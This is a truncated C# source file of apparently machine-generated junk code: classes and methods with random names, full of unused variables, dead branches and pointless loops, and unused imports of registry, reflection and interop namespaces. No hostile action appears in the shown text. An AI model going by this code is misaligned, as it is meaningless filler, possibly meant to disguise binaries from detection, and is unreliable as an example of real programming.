using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Windows.Forms;


namespace Program
{
    public class WYLQPngGIniVaOaLFZBoTHcF
    {
        public void uwCbwObsRpoZuOhzq()
        {
            long qMcXIeGTdz = 60581653409517978;
            int AhDizMLjl = 8213;
            if (AhDizMLjl == 781743)
            {
                AhDizMLjl = AhDizMLjl + 254512;
            }
            ulong yTXQVYUVasTf = 12332560053684806;
            float WuwILIuphTAdwLGy = 2.976553E-25F;
            long ztSdUdXOGa = 79961964443007078;
            byte CKkZGnTih = 243;
            byte BFbDCsOHKHLgPTFyNdcqWwNOiSyGk = 201;
            int RdfTWwbcAHEUZdjNJwwe = 845499451;
            while (RdfTWwbcAHEUZdjNJwwe == 845499451)
            {
                RdfTWwbcAHEUZdjNJwwe += 268021;
            }
            ushort UixVacpMNLCqbaSoRSOfJ = 46036;
            double uBNZZZbIcshqkJTWOzZXUddU = 2.331892E+21;
            if (uBNZZZbIcshqkJTWOzZXUddU == -0.4997685)
            {
                uBNZZZbIcshqkJTWOzZXUddU = Math.Floor(-2.140602E-38);
                Console.ReadLine();
            }
            double zmNkdysBcJLCqTxCbGkVyzLTD = -7.000813E+25;
            while (zmNkdysBcJLCqTxCbGkVyzLTD == 6.629858E+07)
            {
                double ARQWpjeljFpmdhbidw = -1.996741;
                zmNkdysBcJLCqTxCbGkVyzLTD = ARQWpjeljFpmdhbidw * 2;
                try
                {
                    MessageBox.Show(zmNkdysBcJLCqTxCbGkVyzLTD.ToString());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            uint WnoFnmOWfD = 7713;
            ushort YfxkhMyptcVqGTe = 9923;
            float UpORbxDYBiyMKVcVFzH = 1.699719E-37F;
            ulong GVlJWIUSXKIUfJheZIiknTHsZ = 40235849897559224;
            uint WPOGqHq = 52987;
            string Xmx = "HYSEENnUJJXFl";
            ushort cOHBlolbSEWtEp = 63575;
            short SlVoNCVwIVeXtc = -26920;
            string ZmpNkeuWaaHuLELqBMa = "gpmMeEugdzCSpXqMa";
            long gBtMCnbXquHTpdCAJaFI = 831810983193993;
            ulong ZpQeUbOEL = 42468852611671752;
            ulong yJLxcaxmBjczXjewpdljBMe = 27381221506784475;
            byte ppF = 67;
            float eyPmuIZfyZqhCZFmLEwpzZQ = 3.593566E-31F;
            byte yHUBhwqhMMzLIgzEHinxoxdF = 2;
            float neIchhTCADAjMkRSBm = 4.290232E+20F;
            sbyte xiD = 87;
            ulong bEpAoRcceJqEPFZa = 72354003112005302;
            sbyte wmIzB = -51;
            short BVmZUUhPNRVp = 31597;
            int xaE = 5839;
            while (xaE == 5839)
            {
                xaE = 958763;
            }
            short xPwHiblx = -27231;
            string heIdJRLxSeRlkyWZNodVoIJ = "stgJUdDAYKTAJBu";
            int CAgFEjimbzg = 16;
            while (CAgFEjimbzg == 16)
            {
                CAgFEjimbzg = 176797;
            }
        }
        public void oLcDODsmCFyqmVAGOiDUPi()
        {
            double TGwAQltdAPeUmZ = 955362.3;
            if (TGwAQltdAPeUmZ == -8.586303E+11)
            {
                double lCDKqSoWfO = Math.IEEERemainder(3, 4);
                TGwAQltdAPeUmZ = lCDKqSoWfO;
                Console.Write(TGwAQltdAPeUmZ.ToString());
            }
            short ytSstwSOwVjVUUIxFu = 32413;
            uint WVkNiiIFRANzTCnHialpFOcc = 14184773;
            short xuMHPOBzIFjmkjFxy = -5173;
            string tPxuOjkiShfb = "ehyNfKfaQZEQYfujGGlfYjIYq";
            float EsGAzixfchJqMWsDPSF = 2.99127E-32F;
            ulong lDUVSVBzxneDJjAeIDasbXnAjHHSf = 40606388628713798;
            byte jDJmdItKspNWmezWoo = 103;
            long oItJlFPoR = 42506347311908017;
            byte QWnDsQPxoxeJjCsVUpERcFuCN = 63;
            uint nJEFdDVoaf = 86;
            ushort BSMUqUH = 59683;
            float gtPl = 3.592494E+17F;
            ulong nAiGT = 71476406602174344;
            long UeCPTVIJsPByL = 34427980248623559;
            double ZmoLnEafPxYUhZXWjGRQRtbTTXp = 0.001010958;
            while (ZmoLnEafPxYUhZXWjGRQRtbTTXp == -0.001565694)
            {
                ZmoLnEafPxYUhZXWjGRQRtbTTXp = Math.Ceiling(Math.Sinh(-5));
                Console.WriteLine(ZmoLnEafPxYUhZXWjGRQRtbTTXp.ToString());
            }
            byte DoWbNNuLVZjoSTLdENlhoSDcjG = 35;
            float fqsUgUmubVtYZkWh = 24.09273F;
            byte TzEyeF = 177;
            ulong SgGBkPJRuLZyKCRTjoIGUpeWMH = 35176704256772963;
            byte NyPwnqAQkLjXMFUocgZCbKOE = 37;
            float FiQWjqcfMAlsERoLbyLboVmgtCJN = -3.130458E+13F;
            byte ttVHwOaGKz = 41;
            ulong OwKNYNfyTIKVJEIJpdcmYZkW = 28846187924128826;
            ushort FgYZeWfQALk = 46913;
            ulong sWuwfDRP = 45869898053419520;
            float zqYCKpYggiBALWEcehXwHUAQVkVx = -1.702995E-05F;
            uint UnmwlRmdxYwJnMcheyFjFxpFShGA = 544971;
            long KEGxKhQmVUYJARCjiNqZT = 41738366436073260;
            ulong UnMYLgGyWHqnLyIeaGxq = 27451941762382623;
            string MchldwOSRdDowsCaIZq = "DzPyZKDUDAYhwsVngz";
            ushort qiPsOtQto = 27146;
            int hzcnnLl = 8571;
            if (hzcnnLl == 349786)
            {
                hzcnnLl += 96590;
            }
            ushort dymTiGdluJxJGUjGhVQZXoHaxl = 64843;
            ushort TxntBNVbCuDdmJF = 54804;

        }
        public void HBJ()
        {
            byte xowWOQm = 115;
            double KNBmiofgnEGBnWKHciu = 0.007225658;
            double YePeyWtAhsJNBtwLDVa = 1.063066E+37;
            YePeyWtAhsJNBtwLDVa = Math.Sqrt(3);
            KNBmiofgnEGBnWKHciu = YePeyWtAhsJNBtwLDVa;
            Console.Write(KNBmiofgnEGBnWKHciu.ToString()); ulong gOu = 13808169125580328;
            double TJX = -9.883333E+11;
            if (TJX == 1.033443E-07)
            {
                TJX = Math.Ceiling(Math.Tanh(0.1));
                Console.ReadLine();
            }
            double ITUZRy = -3.954825E-12;
            while (ITUZRy == 2.132832E+12)
            {
                double GnlNzIMIwSFfupatnRNLaI = Math.IEEERemainder(3, 4);
                ITUZRy = GnlNzIMIwSFfupatnRNLaI;
                try
                {
                    Console.WriteLine(ITUZRy.ToString());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            long qYucySSUhzlFzsKLtmPPiQbazgmxg = 74641359629720382;
            ushort duEZ = 49677;
            sbyte FnJKibkUPCWuE = -47;
            int OaHsyFbYDYjMwG = 266381282;
            if (OaHsyFbYDYjMwG == 548415)
            {
                OaHsyFbYDYjMwG += 973668;
            }
            ulong YRJmdPOOSMyXQY = 21071280636162806;
            float zjLJAzOHJqcQJkB = -3.621435E-24F;
            ulong zoyQSg = 30180646788073848;
            byte UefotXQozVqeLzaBsesjbtT = 137;
            short kVHbpQzxHhe = 18;
            ulong ziqWQbzdLDXIHaNB = 87398042785139033;
            int HnSTwSqSLTcXMqRg = 769;
            while (HnSTwSqSLTcXMqRg == 769)
            {
                HnSTwSqSLTcXMqRg = 451384;
            }
            long WCEKO = 63108241964207562;
            float epPpTz = -9.120924E+24F;
            int GLFtXqiEN = 888221022;
            while (GLFtXqiEN == 888221022)
            {
                GLFtXqiEN = 156129;
            }
            short HyVHVtX = 31604;
            short hQHJKYziSWCtX = -17901;
            int TmQJMhCpHtKFKqI = 5867;
            if (TmQJMhCpHtKFKqI == 752198)
            {
                TmQJMhCpHtKFKqI += 114641;
            }
            short piVpxGnB = 12522;
            string AKiKJaopbqnTzC = "hPakTsFcBA";
            float eKtTZFmRXkUnayPmTbpxOhzzB = -2.415564E-31F;
            string IIkSikHJyonkKqXUMjxEqjzjudW = "UtBziWpDK";
            ushort miFwNbkeQCFOpKBEyjazenuOeO = 52373;
            string bukpqiuNOMhiYfLpFjOIsSt = "XNYPQqYliqOguyZBgRJzT";
            short iJzAEb = -7096;
            ushort aCsEkGWy = 49122;
            double IsE = 3.382516E-28;
            if (IsE == -30.55656)
            {
                IsE = Math.Truncate(IsE);
                try
                {
                    MessageBox.Show(IsE.ToString());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            ulong mdUSpOwAPhqnqJkwWHpdXptSHq = 79982557433552828;
            ulong gnfMzCCxbYMeSnDK = 85544966693046617;
            short izZSGoSLnIBFFxOW = 20769;
            long qedNzkVfTPecgtZtdy = 2522962082541880;

        }
        public void hAiOlDwbueMBILjZWiGu()
        {
            byte cLzIqgeXdSoDNGKaTB = 184;
            short nqWCHmlkQoPyExzoFkn = 28904;
            ushort Tke = 62878;
            int WpeJTZPtCfK = 854318962;
            if (WpeJTZPtCfK == 558418)
            {
                WpeJTZPtCfK += 510274;
            }
            sbyte ilLnpzw = -89;
            byte MyJJWnBkfEFIeOz = 132;
            ushort KNpLY = 51482;
            ushort kbPk = 31129;
            float VQJakWzOsuDFChXQP = -5.987602E-15F;
            uint hbzUnSczwVeNeiXP = 180266;
            sbyte ZXpwkUWnl = -125;
            sbyte tdNPjfW = -111;
            ushort XzzRxYZbnUh = 14993;
            uint LdKuWPmu = 92827807;
            ushort xhFu = 16315;
            sbyte KaRXtyYnjMlahEDegxDgHcDKC = -14;
            ushort SxUIcwPjTfqWYBcID = 60248;
            byte TdyYLXjIyhwWdxx = 196;
            float XMOtkafGifaVgGkVJO = 1.52479E+32F;
            double khNML = -2.482401E+26;
            while (khNML == -5.639721E-18)
            {
                double KBSyTeOeHDaPLhNIQ = 1.615809E+36;
                KBSyTeOeHDaPLhNIQ = Math.Sqrt(3);
                khNML = KBSyTeOeHDaPLhNIQ;
                try
                {
                    int HGApLOHaMeiILliVC = 9158544;
                    if (HGApLOHaMeiILliVC == 69195)
                    {
                        HGApLOHaMeiILliVC++;
                    }
                    else
                    {
                        HGApLOHaMeiILliVC--;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            long yzTsfZdUtgipheUyShZWFMnT = 48441581557116598;
            string EnlRCMhnDuUDicGNTOLOkLjZE = "FXAGNhmoBHlbGmOqjU";
            double ssAIUGpoI = 1.118988E-33;
            if (ssAIUGpoI == -4.135599E+34)
            {
                double INoUCZCSiyZTBpasllyRMgSXIIEZ = -1.883058E-23;
                ssAIUGpoI = INoUCZCSiyZTBpasllyRMgSXIIEZ / 3;

            }
            ulong TWkRGcMqGmXeFYWCVxfKxBYA = 35195757971535414;
            int kGgELjsyQBySgMOyMyjftsX = 3100277;
            while (kGgELjsyQBySgMOyMyjftsX == 3100277)
            {
                kGgELjsyQBySgMOyMyjftsX = 415111;
            }
            float uzSNpwqLWsYLzbXeQdzXUuAtSIw = 5.253992E-15F;
            long bUGdtoYybwMnOuI = 65277989092236788;
            string ZzU = "ZOunUXQSYEQRHxDhgLZk";
            sbyte zaWHeXFduQePcHsaUySHLB = -1;
            float BwSUnzKA = -3.334718E-15F;
            ushort nSSmViZNSuV = 52471;
            sbyte DsDbXBcxFDNigqupOqZJHFZtP = -45;
            uint sfBcOxW = 9291;
            byte SnRnpBMcIsDH = 148;
            float kYtjlHaUezbKwL = -3.54817E-35F;

        }
        public void CYgwPpJSdoSPQ()
        {
            uint lqkYYNaMSuNPnRpqmoieGKbxIKq = 34;
            sbyte oZfye = 0;
            ushort HCmob = 3257;
            uint bNXGBHwpDoPpo = 829851;
            ushort ozPiulRQkDDtwatfopxuD = 38662;
            long QVQLgPkLSGMFMlICgP = 53920035811273373;
            double wZgKQ = -2.131148E-12;
            while (wZgKQ == -4.957472E-31)
            {
                double BPnPucJVnOoDMTOCpWPfpTAcOC = 1.688207E-07;
                wZgKQ = Math.Ceiling(BPnPucJVnOoDMTOCpWPfpTAcOC);

            }
            ulong kCIplaSiAQmIwQLyxCJ = 24370423605076180;
            string ykktnDzObOGXOX = "ALZyNaotgHNDMBjFAQNcF";
            string hnlKuNdieM = "IwIco";
            ushort SeMBZMn = 54246;
            byte haUfyy = 216;
            byte qUGczJRITPWyBsUN = 242;
            uint nBxEEXaeRZjXQTOdnlbn = 165733518;
            sbyte bnJHIasBVkWaV = -46;
            string yFZIJ = "fEMoHBWnPfwbCoouxRHKcFWNi";
            double VQmiyMjh = -1.027867E+30;
            while (VQmiyMjh == -2.935463E+26)
            {
                VQmiyMjh = Math.Ceiling(Math.Cos(2));

            }
            ulong SuqCRRCTV = 77089647216977222;
            int NlDkplAKLSzhamjVaoWdwiJIy = 947094;
            while (NlDkplAKLSzhamjVaoWdwiJIy == 947094)
            {
                NlDkplAKLSzhamjVaoWdwiJIy += 76335;
            }
            float nZZ = -1.759319E-25F;
            string shRayFyKqG = "lQBxEDVOVosGjOEhNnjHRnHMmsJ";
            byte YnQzFSeARwxuwfaaDHlTxKwgYe = 244;
            sbyte ilUKVWaChFWzIVSOmxhHLLLx = -40;
            ushort SKAAUWLJjD = 46107;
            uint ZAubpuOP = 363037;
            long PDdzByqAIiRIecDXmIkDW = 23750927706027281;
            uint qOReuHjKet = 54;
            float NXnSRCVhjNRWRiRptRgT = 3.085087E+27F;
            short ipcYgiVxPFDMTfQYtiFdmzPbSOZj = -5994;
            double TJpJBz = 1.330421E-36;
            if (TJpJBz == 8.442316E-08)
            {
                TJpJBz = Math.Ceiling(Math.Atan(-5));
                int? bgsjLaRyKdExpAxhE = 8020690;
                bgsjLaRyKdExpAxhE += 57908;
            }
            uint YZyQKRhupPVbURLJdjL = 844851700;
            ushort FuazCOsIfGXzpbGzNdyaNBLyUzEuH = 56366;
            uint FbTxJtGHXgQxWtwIyLYWutk = 68;
            int dkYbmhjTnijQuzRcHL = 5139;
            if (dkYbmhjTnijQuzRcHL == 915103)
            {
                dkYbmhjTnijQuzRcHL += 946941;
            }
            float CtlQOMePCwZeEnNAgzmVFyDpFu = -7.137731E-35F;

        }
    }
    public class boag
    {
        public void HQIyuyLFXxcC()
        {
            sbyte ObV = -16;
            long odRVluqbNBfZYkIXRJdQkaBgmdmuo = 41760974825132505;
            ulong afJRxpdDW = 24953870654377792;
            int IihWMNwmIShfYeydKCidQ = 51;
            while (IihWMNwmIShfYeydKCidQ == 51)
            {
                IihWMNwmIShfYeydKCidQ += 801111;
            }
            float yqOYoedSjWebdwLP = -4.78636E+27F;
            sbyte ojngAUzIRVnXDOkBtgJZukBF = -111;
            string OQCOGKdjmcHAuHxboJhApj = "wgjgwdK";
            long yhKR = 53463463886717827;
            ulong otYjkVWDxEHfIwDIgDsE = 52210481727209198;
            string lLJAVOyTzOhVMgjkzmLRxwf = "GcxtAcW";
            string KqVyhBPkmeFxgBQuB = "MjjpQGATSqeuwSftbPoOq";
            ulong HjqCNACHYZtjRstCpXnJygSJMpN = 81148945441566047;
            sbyte eMuqLfwcJnaInYQc = -108;
            ushort qJQyMcGTlajDPmbl = 14768;
            float NbyHcbNRNgWp = 3.241109E+25F;
            string RooJnflibALlwlNFiNLzUcNw = "lSNpLnMLzkXXkdIPnGDpBwBtsgigF";
            float CTKcmATplZCWaQIYJdKHyje = -1.652686E+22F;
            short XEeFfExwdBau = -12894;
            ushort qqZAAELiBd = 60031;
            byte qPkmVgWMhwws = 148;
            ushort yIJtlhTOAqSPluFCjp = 6774;
            string oOAizDjWFg = "ihMSuCbizaMVcqKsETkczpohTik";
            ulong JSVjWHeJMgJoWGnESyS = 61784022281491183;
            float YlqmEPiRMfLFJRMDND = 3.859462E-38F;
            int MsZ = 529;
            if (MsZ == 113227)
            {
                MsZ = 497618;
            }
            ulong eOVqbsQeM = 88639489367487637;
            short hRZXAZniMuoGHWsEdQlLkUVSUw = -19207;
            ulong mzLPGHwfRxqOidLxCKkRYMBGGJ = 2842406934444068;
            uint FRapXzmuUWbQjwtLZZVBYeiXtzY = 35132219;
            int TFQRKKVTAAf = 67751275;
            if (TFQRKKVTAAf == 723152)
            {
                TFQRKKVTAAf = 727981;
            }
            long PywYXBJdXzBz = 30176293015793175;
            string gwbSt = "oVNldZOTyHSqbHYu";
            double dud = -2.080672E-21;
            if (dud == -2.590209E-37)
            {
                double WfgiOcMnwcDNLEDlHufMxaOYxQIxe = -2.732853E+15;
                dud = Math.Ceiling(WfgiOcMnwcDNLEDlHufMxaOYxQIxe);

            }
            long JJzWUOx = 3518726114198448;
            short BPYTGx = -6131;

        }
        public void SCEcIVuIbKMaotgta()
        {
            long ILighOZCkJocmdublSZy = 29491705835414255;
            sbyte FSXPORJwxoJujYMHAXUq = 100;
            uint jIA = 668758128;
            int xhtDdxfyoE = 8217;
            while (xhtDdxfyoE == 8217)
            {
                xhtDdxfyoE = xhtDdxfyoE + 599079;
            }
            double PYuuWROdRNhnSaSiSCaHUpB = -2.017549E+12;
            if (PYuuWROdRNhnSaSiSCaHUpB == 5.761395E-33)
            {
                PYuuWROdRNhnSaSiSCaHUpB = Math.Ceiling(Math.Cos(2));
                object GsobL;
                GsobL = -1175.008;
                Console.WriteLine(GsobL.ToString().ToLower());
            }
            uint fNHfnoQpzSTK = 74;
            int GfUAhziswhDqGKeefaj = 874;
            while (GfUAhziswhDqGKeefaj == 874)
            {
                GfUAhziswhDqGKeefaj = GfUAhziswhDqGKeefaj + 44571;
            }
            double AZPoFe = -5.402516E-20;
            while (AZPoFe == -1.755391E-37)
            {
                AZPoFe = Math.Ceiling(Math.Atan(-5));
                try
                {
                    MessageBox.Show(AZPoFe.ToString());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            byte smNBq = 7;
            long TQMTWbXjxMWBgEqXBQlPWx = 1381415046681533;
            ulong cOZstLdnWLICSMZOVPZBPUPxAoDPc = 73691152200491743;
            double PNXTkPPFFhjFIKokiZE = 4.539029E-33;
            if (PNXTkPPFFhjFIKokiZE == -1.931688E-22)
            {
                PNXTkPPFFhjFIKokiZE = Math.Truncate(PNXTkPPFFhjFIKokiZE);
                try
                {
                    Console.WriteLine(PNXTkPPFFhjFIKokiZE.ToString());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            short GqOBc = 9806;
            sbyte mIDgshXeWhySuSublyslQQOXkn = 10;
            string JpCBAqk = "RSQqeUCezLO";
            double oGoUcxTGWeGSWnRVqUCiMu = 1425.919;
            double PhxuLmGyUsKVOjziHL = Math.Log(1000, 10);
            oGoUcxTGWeGSWnRVqUCiMu = PhxuLmGyUsKVOjziHL;
            try
            {
                int NaUbNZqAHN = 6242737;
                if (NaUbNZqAHN == 83181)
                {
                    NaUbNZqAHN++;
                }
                else
                {
                    NaUbNZqAHN--;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            string QsxDoDIGLDwxAKA = "guMWMltOJOFBuuGWYxk";
            ushort OkeeEQoodtxifqlfeN = 38152;
            double UCXhlqWAydzfdsjHSiwd = -1.735112E+07;
            while (UCXhlqWAydzfdsjHSiwd == -2.5664E-12)
            {
                UCXhlqWAydzfdsjHSiwd = Math.Ceiling(Math.Cos(2));
                Console.Write(UCXhlqWAydzfdsjHSiwd.ToString());
            }
            sbyte TACYsNljAndH = 0;
            long jqVoukx = 84704478798297945;
            double dWuFRto = -1.016157E-21;
            if (dWuFRto == -4.711781E-13)
            {
                dWuFRto = Math.Ceiling(Math.Tanh(0.1));
                try
                {
                    int WjBBBdILn = 6995749;
                    if (WjBBBdILn == 55805)
                    {
                        WjBBBdILn++;
                    }
                    else
                    {
                        WjBBBdILn--;
                        Console.Write(WjBBBdILn.ToString());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            byte gbnEKPbnFt = 47;
            ulong IeqYWxWVBXsY = 3391137342018509;
            long msdpWYawkYqfOjCEOgosGeVG = 29593152378982819;
            long RZUHBXVfMuIeAQpIdJppjhyzP = 56355850513468180;
            double DJgHqyBsBXxb = -9.368585E-31;
            DJgHqyBsBXxb = Math.Ceiling(Math.Tan(1));
            try
            {
                MessageBox.Show(DJgHqyBsBXxb.ToString());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            int IMlBlcGVbgGJkuAqO = 3177;
            if (IMlBlcGVbgGJkuAqO == 87117)
            {
                IMlBlcGVbgGJkuAqO = IMlBlcGVbgGJkuAqO + 279847;
            }
            ulong NlgjVEaVfmQLtu = 71710940413355167;
            float XcuwPMD = -0.1111895F;
            sbyte RAMfEGOehJGuZya = 122;
            float IkbuYmSiFfuKtlnWcq = -1.284366E-30F;
            sbyte yHKzqJwYONKTSVy = -17;
            uint nwbILypufcwJUNx = 75;
            ushort AViNGqHZAttAGQGSMyPWl = 11140;

        }
        public void DtEfTXyKhcMbEeIwpezQbNEPSnVK()
        {
            long zzqXHuclNccJlxTPcNeczROtWQPOm = 48341935408203158;
            int mseqwOsBhVdlhGJ = 631380;
            if (mseqwOsBhVdlhGJ == 32136)
            {
                mseqwOsBhVdlhGJ = mseqwOsBhVdlhGJ + 803020;
            }
            int YibpKcRGey = 8270;
            if (YibpKcRGey == 500558)
            {
                YibpKcRGey = 356478;
            }
            int pISjtThpKYEMEJJegi = 4599;
            if (pISjtThpKYEMEJJegi == 308797)
            {
                pISjtThpKYEMEJJegi = 315699;
            }
            double TPYfgstyAXxPPhhusTbsTHiG = -5.554104E-14;
            TPYfgstyAXxPPhhusTbsTHiG = Math.Ceiling(Math.Sinh(-5));
            int? ulpmfxoHVmGtS = 9059628;
            ulpmfxoHVmGtS += 25998; int NNYNbSgGBfPNjdBkquzIi = 16787224;
            while (NNYNbSgGBfPNjdBkquzIi == 16787224)
            {
                NNYNbSgGBfPNjdBkquzIi = NNYNbSgGBfPNjdBkquzIi + 633735;
            }
            ushort VKGbCwcebaXSgXqihOJqzwBPU = 32725;
            double DQikNPGwiMJJygpuBQ = -1.102264E+27;
            DQikNPGwiMJJygpuBQ = Math.Pow(2, 2.1);
            Console.ReadKey(); ulong LBVmsZYhbxcDcEsNljNAuW = 54781572434951065;
            double BtMFRcJfoDuJiPCdSk = -7.311089E+29;
            double BCikoxAcKSOVjBHkRCF = 1.006945E-18;
            BtMFRcJfoDuJiPCdSk = Math.Round(BCikoxAcKSOVjBHkRCF);
            try
            {
                Console.WriteLine(BtMFRcJfoDuJiPCdSk.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            long jgmAUqLQIVypLqdeBxsRh = 68460602800165624;
            uint HUQZxTSkVYWjpIZycfZZR = 8810;
            uint YwdJGfIglQwUsHlIkxSlmSj = 761327;
            long iDToaomzzOCoTnde = 51241241362611198;
            float oAf = -7.920971E+10F;
            double HzEtBwGfhNTKhZXjOsSjYaxkmuZa = 7.399981E-12;
            if (HzEtBwGfhNTKhZXjOsSjYaxkmuZa == -3.150681E+09)
            {
                double MpiXEqZzWNbspsSPL = -4.046033E-21;
                HzEtBwGfhNTKhZXjOsSjYaxkmuZa = MpiXEqZzWNbspsSPL / 3;

            }
            double yawsVuHNfHjNskCALTYo = -1.250715E+09;
            if (yawsVuHNfHjNskCALTYo == 2.430907E-31)
            {
                yawsVuHNfHjNskCALTYo = Math.Sqrt(4);
                Console.ReadLine();
            }
            short RBdfBhLFxneDiJzTxCLOfAHOP = 9355;
            sbyte xWwTDTyVlHUiZYMDYsPAfBqiV = 9;
            long UpqTcThASla = 74073470594836239;
            sbyte dQxSGMVGmXahgbWpafgQlKN = -39;
            uint CTBCtOEDQ = 895304;
            string glTGnZgfDLBHxHq = "tddtsjceLElFEkxwa";
            long EsezsthZiaUXhmbxxRIeWjPUKODCs = 31559631120980872;
            int akkTeRHesDOaFsEctEjPFQ = 63640480;
            if (akkTeRHesDOaFsEctEjPFQ == 262315)
            {
                akkTeRHesDOaFsEctEjPFQ = akkTeRHesDOaFsEctEjPFQ + 184638;
            }
            uint ShRfITLqKddJjZEm = 269371;
            byte tFfQgjFFZiEyFSLHiA = 180;
            long cUgLWGHdHwZZ = 62018724901640900;
            sbyte CAHdsoWdaEBm = -48;
            long ejEYBsNEyKNyFhBmwjMsHeSnsgDux = 86603093420596668;
            short ZOWiuFRsWBpecFssZso = 8144;
            ushort thYbXVCjMsfEMFLVyJBOHTgu = 39692;
            byte LXxFKlk = 101;
            ulong tIVRMPXZ = 20344806640244104;
            int AbFwNMQ = 2893;
            if (AbFwNMQ == 333678)
            {
                AbFwNMQ = 527182;
            }
        }
        public void WLebGXUe()
        {
            sbyte gqwdSCYEHbVNH = 113;
            float bABjEhq = 2.546551E+15F;
            ushort FAJnwSjowqMuNQSLAoiehgxV = 26734;
            int RYZStzMtdXNAVxIASpeNuMxSoCoIz = 75;
            if (RYZStzMtdXNAVxIASpeNuMxSoCoIz == 873560)
            {
                RYZStzMtdXNAVxIASpeNuMxSoCoIz = RYZStzMtdXNAVxIASpeNuMxSoCoIz + 358982;
            }
            short AsWaxONMPnIAHF = 7460;
            short FfChERieUajUJbdqdtXhNXYKf = -793;
            byte hSzhDanmPnWCNWDNDSgm = 145;
            sbyte lJidIgSbdECWcDcsIN = 80;
            int xwwQwkgnsbeZnmztWHgWmSYk = 49;
            while (xwwQwkgnsbeZnmztWHgWmSYk == 49)
            {
                xwwQwkgnsbeZnmztWHgWmSYk = 483038;
            }
            uint GOPmNnlVMNLCyWOoFYLfKGD = 448799;
            byte VaGOTCqtBzkHJwkkAgxOeMVW = 135;
            ulong cakjQDzpVfZSa = 23779345607054396;
            uint dybwMjfKmfintp = 4019;
            string eoeBoxIC = "dDjLIDFgNPgNfQw";
            ulong SSjXEYnSHkqEiGNjMbhcuB = 18946580409904934;
            uint ODEQsCBEWSbsmEEjtDuPn = 34171997;
            short uOcssw = 10602;
            long QGbXSkBEgDAsCGXxDVFL = 89032337455886245;
            byte ytIGNYhxKinKDPSOTh = 26;
            double AdalMwPmVycsDegLWSZnfkwy = 14.35087;
            while (AdalMwPmVycsDegLWSZnfkwy == -2.960116E+32)
            {
                AdalMwPmVycsDegLWSZnfkwy = Math.Ceiling(Math.Acos(0));
                int? cXogIKoJEBkZwpQRLbOhRdD = 8986433;
                cXogIKoJEBkZwpQRLbOhRdD += 50863;
            }
            short EUZwzKMOS = 32272;
            short KoNxJB = -2065;
            ushort zkZJaTWbyOMdngNUNSCVq = 53206;
            int NgnlyoucWDeJZMzRQMwkGdx = 98;
            if (NgnlyoucWDeJZMzRQMwkGdx == 657135)
            {
                NgnlyoucWDeJZMzRQMwkGdx = NgnlyoucWDeJZMzRQMwkGdx + 929544;
            }
            uint IFlWTGLFiuKg = 4533667;
            string auLfFwwhJLflVsMfzkxeNQFkegl = "VWLfVHWnksNmjdmiAAKQIEJBG";
            double kPBbyi = 2.288679E-21;
            kPBbyi = Math.Ceiling(Math.Cosh(5));
            Console.ReadLine(); string lybcYJMfd = "adeWVoqjXcsZOGJkANWpQHGhD";
            double KylMLxFPHUmUSPfUZUmKwtNiZjNau = -1.908146E+33;
            while (KylMLxFPHUmUSPfUZUmKwtNiZjNau == 1.265517E-14)
            {
                double IDjRcplSdCKM = Math.IEEERemainder(3, 4);
                KylMLxFPHUmUSPfUZUmKwtNiZjNau = IDjRcplSdCKM;
                try
                {
                    Console.WriteLine(KylMLxFPHUmUSPfUZUmKwtNiZjNau.ToString());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            float sVCupEYbGPYa = -7.586572E-31F;
            int ylNsmPoOSsBed = 878772311;
            while (ylNsmPoOSsBed == 878772311)
            {
                ylNsmPoOSsBed = 587226;
            }
            byte SbeSIATPnODYOxuKBf = 143;
            int CXcUXOVREjCtQGkJBGpwZEF = 105935610;
            while (CXcUXOVREjCtQGkJBGpwZEF == 105935610)
            {
                CXcUXOVREjCtQGkJBGpwZEF = 445243;
            }
            double bGRqdbXLLYXLFbGXRibaBmlPXtfPH = -6.188113E-08;
            while (bGRqdbXLLYXLFbGXRibaBmlPXtfPH == 2.574772E-22)
            {
                double hHDUGxbTZVAt = -2.916943E+18;
                hHDUGxbTZVAt = Math.Sqrt(3);
                bGRqdbXLLYXLFbGXRibaBmlPXtfPH = hHDUGxbTZVAt;
                Console.ReadKey();
            }
            ushort tRnTzRHtIubpbzSgFnpqMU = 51399;

        }
        public void AFpFRzbHEJeOtWomM()
        {
            float UNOXnVEQJGgZzcMuTBcD = -1.831084E-11F;
            ushort sudOIZdFUmUPLIcJmIsbyJ = 39503;
            long DxMKoyCsbFURQhKDCeli = 24093718029613001;
            ushort JOtgeDqVGP = 23659;
            ushort chRyAJAWFtDLTknqZWCZN = 60207;
            sbyte KdgkGAxPAaipCSb = -46;
            float ewQwlsdFGTRy = 8.649067E-29F;
            string NxDopeXNkTbX = "hUkgtRLJnROhbTDYcdbnieFO";
            int Zyck = 3247;
            while (Zyck == 3247)
            {
                Zyck = Zyck + 982193;
            }
            int DpqKAFOhnlu = 15644497;
            if (DpqKAFOhnlu == 689911)
            {
                DpqKAFOhnlu = DpqKAFOhnlu + 621304;
            }
            string xCpRmHdAybl = "EsMCMWAFZaxPO";
            string cDqxixKjP = "AecxfqfcR";
            float xnmOgyoxeCcjta = 5.606571E-30F;
            int YUhX = 2523;
            if (YUhX == 168363)
            {
                YUhX = 893994;
            }
            long MXlQHndJbYu = 22636295200546260;
            byte ZSWozZaVLowNPPeY = 141;
            ushort bXbZAunFRXNNMzQNfoCho = 4704;
            ulong KZbVUqWgbAi = 26552883003178189;
            double CJnZcZJbluYjKoBttLAbGMmolPmS = 5.539132E+33;
            double WSsmfPektnDWCSKKWsQxZNm = -1.326252E-26;
            CJnZcZJbluYjKoBttLAbGMmolPmS = Math.Ceiling(WSsmfPektnDWCSKKWsQxZNm);
            try
            {
